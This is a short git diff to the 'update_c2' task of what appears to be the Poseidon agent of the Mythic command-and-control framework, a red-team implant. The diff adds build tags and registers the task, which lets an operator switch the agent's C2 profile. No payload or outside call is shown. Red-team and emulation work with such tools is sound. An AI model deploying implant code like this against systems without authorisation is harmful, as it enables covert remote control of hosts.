@@ -1,14 +1,22 @@
+//go:build (linux || darwin) && (update_c2 || debug)
+
 package update_c2
 
 import (
 	"encoding/json"
 	"fmt"
+
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
 
 	// Poseidon
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("update_c2", Run)
+}
 
 type Arguments struct {
 	C2Name      string
